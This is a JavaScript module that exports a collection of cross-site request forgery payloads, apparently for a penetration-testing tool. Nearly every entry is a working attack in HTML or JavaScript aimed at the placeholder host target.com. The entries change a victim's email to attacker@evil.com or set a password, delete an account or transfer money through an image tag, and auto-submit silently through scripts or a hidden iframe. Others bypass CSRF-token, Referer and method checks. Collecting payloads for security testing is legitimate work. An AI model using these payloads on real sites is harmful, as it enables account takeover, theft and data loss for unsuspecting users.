/**
 * CSRF (Cross-Site Request Forgery) Payload Module
 * Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection
 *
 * Categories: basic, advanced, filter_bypass, context_html
 */

const payloads = [
    // ── BASIC ──────────────────────────────────────────────────────────────────
    {
        type: "basic",
        payload: "<form action=\"https://target.com/account/change-email\" method=\"POST\">\n  <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\" />\n  <input type=\"submit\" value=\"Click me\" />\n</form>",
        description: "Basic CSRF form — change victim's email address",
        expected_behavior: "Victim clicks submit; email changes to attacker@evil.com without CSRF token"
    },
    {
        type: "basic",
        payload: "<form action=\"https://target.com/account/change-password\" method=\"POST\">\n  <input type=\"hidden\" name=\"password\" value=\"hacked123\" />\n  <input type=\"hidden\" name=\"confirm_password\" value=\"hacked123\" />\n  <input type=\"submit\" value=\"Win a prize!\" />\n</form>",
        description: "CSRF form — change victim's password",
        expected_behavior: "Victim submits form, password changes to 'hacked123'"
    },
    {
        type: "basic",
        payload: "<img src=\"https://target.com/api/delete-account?confirm=true\" />",
        description: "GET-based CSRF via image tag",
        expected_behavior: "Browser sends GET request when loading image, triggering account deletion"
    },
    {
        type: "basic",
        payload: "<img src=\"https://target.com/transfer?to=attacker&amount=10000\" />",
        description: "GET-based CSRF — fund transfer via image",
        expected_behavior: "Invisible image load triggers money transfer to attacker"
    },

    // ── ADVANCED ───────────────────────────────────────────────────────────────
    {
        type: "advanced",
        payload: "<script>\nvar form = document.createElement('form');\nform.method = 'POST';\nform.action = 'https://target.com/account/change-email';\nvar input = document.createElement('input');\ninput.type = 'hidden';\ninput.name = 'email';\ninput.value = 'attacker@evil.com';\nform.appendChild(input);\ndocument.body.appendChild(form);\nform.submit();\n</script>",
        description: "Auto-submitting CSRF form via JavaScript",
        expected_behavior: "Form auto-submits on page load; no user interaction required"
    },
    {
        type: "advanced",
        payload: "<script>\nfetch('https://target.com/api/change-email', {\n  method: 'POST',\n  credentials: 'include',\n  headers: {'Content-Type': 'application/x-www-form-urlencoded'},\n  body: 'email=attacker@evil.com'\n});\n</script>",
        description: "CSRF via fetch API with credentials",
        expected_behavior: "Sends authenticated POST request; bypasses if no CSRF token checked"
    },
    {
        type: "advanced",
        payload: "<script>\nvar xhr = new XMLHttpRequest();\nxhr.open('POST', 'https://target.com/api/settings', true);\nxhr.withCredentials = true;\nxhr.setRequestHeader('Content-Type', 'application/json');\nxhr.send(JSON.stringify({\"email\":\"attacker@evil.com\"}));\n</script>",
        description: "CSRF via XHR with JSON content-type",
        expected_behavior: "Sends JSON body with cookies; works if server allows cross-origin JSON"
    },
    {
        type: "advanced",
        payload: "<form action=\"https://target.com/api/admin/add-user\" method=\"POST\" enctype=\"text/plain\">\n  <input name='{\"username\":\"hacker\",\"role\":\"admin\",\"ignore\":\"' value='\"}' type=\"hidden\" />\n  <input type=\"submit\" value=\"Submit\" />\n</form>",
        description: "CSRF with JSON body via text/plain encoding trick",
        expected_behavior: "Constructs valid JSON via form name+value; bypasses urlencoded-only CSRF checks"
    },

    // ── FILTER BYPASS ──────────────────────────────────────────────────────────
    {
        type: "filter_bypass",
        payload: "<form action=\"https://target.com/api/update\" method=\"POST\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"\" />\n  <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\" />\n  <input type=\"submit\" />\n</form>",
        description: "CSRF token bypass — empty token value",
        expected_behavior: "Some backends accept empty CSRF tokens; form submits successfully"
    },
    {
        type: "filter_bypass",
        payload: "<form action=\"https://target.com/api/update\" method=\"POST\">\n  <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\" />\n  <input type=\"submit\" />\n</form>",
        description: "CSRF token bypass — omit token entirely",
        expected_behavior: "Some backends only check token IF present; omitting it bypasses validation"
    },
    {
        type: "filter_bypass",
        payload: "<meta name=\"referrer\" content=\"no-referrer\">\n<form action=\"https://target.com/api/update\" method=\"POST\">\n  <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\" />\n  <input type=\"submit\" />\n</form>",
        description: "Referer header bypass — suppress with meta tag",
        expected_behavior: "Prevents Referer from being sent; bypasses Referer-based CSRF checks"
    },
    {
        type: "filter_bypass",
        payload: "<form action=\"https://target.com/api/update\" method=\"POST\">\n  <input type=\"hidden\" name=\"_method\" value=\"PUT\" />\n  <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\" />\n  <input type=\"submit\" />\n</form>",
        description: "HTTP method override to bypass PUT-only CSRF protection",
        expected_behavior: "Uses _method override; backend processes as PUT but browser sends POST"
    },

    // ── CONTEXT: HTML ──────────────────────────────────────────────────────────
    {
        type: "context_html",
        payload: "<iframe style=\"display:none\" name=\"csrf-iframe\"></iframe>\n<form action=\"https://target.com/api/update\" method=\"POST\" target=\"csrf-iframe\">\n  <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\" />\n</form>\n<script>document.forms[0].submit();</script>",
        description: "Hidden iframe CSRF — silent auto-submit",
        expected_behavior: "Form submits into hidden iframe; victim sees no redirect or indication"
    },
    {
        type: "context_html",
        payload: "<body onload=\"document.forms[0].submit()\">\n<form action=\"https://target.com/api/update\" method=\"POST\">\n  <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\" />\n</form>",
        description: "Body onload auto-submit CSRF",
        expected_behavior: "Form auto-submits when page body loads"
    },
];

module.exports = {
    vulnerability: "csrf",
    name: "Cross-Site Request Forgery (CSRF)",
    description: "PoC payloads for testing CSRF vulnerabilities including auto-submitting forms, JSON body tricks, and token bypass techniques",
    payloads,
};
